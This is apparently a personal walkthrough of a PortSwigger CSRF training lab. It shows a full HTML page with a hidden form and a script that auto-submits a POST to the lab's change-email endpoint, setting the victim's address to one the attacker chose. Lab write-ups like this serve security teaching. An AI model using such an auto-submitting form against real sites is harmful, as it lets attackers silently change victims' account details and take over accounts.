# Portswigger CSRF Lab - 1 

##  CSRF vulnerability with no defenses
In this lab we have to perfrom CSRF (Cross Site Request Forgery) which allows a user to make unintentional requests like changing user's email address which is the objective of this lab

<img src="https://i.imgur.com/YmaHQoB.png"/>

We are given credentials to log into our account 

<img src="https://i.imgur.com/6qHauWq.png"/>

We can update the email address from this page but this isn't the way we have to update it 

<img src="https://i.imgur.com/A1papzn.png"/>

If we look at the source code we can see the html for this form 

<img src="https://i.imgur.com/IXAAA6q.png"/>

We have `Go to exploit ` server (I don't have it now since I have solved this lab) , so going to that we will have options like `store` , `exploit` ,`deliver exploit` and `access logs` so first we need to craf a csrf exploit for that we need to copy the same html form content and in `action` paramter we add the url with `/my-account/change-email` 

```html
<html>
<body>
<form action="https://ac771fae1eadea59c0730ef5005c00f2.web-security-academy.net/my-account/change-email" method="POST">
<input required type="hidden" name="email" value="ez@swigger.com">
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```

It's not necessary to make the input hidden but real csrf attacks like this where you don't see any input when you click a link and something happens in the back , so this request will make the email changed to ez@swigger.com and with this we completed this lab 
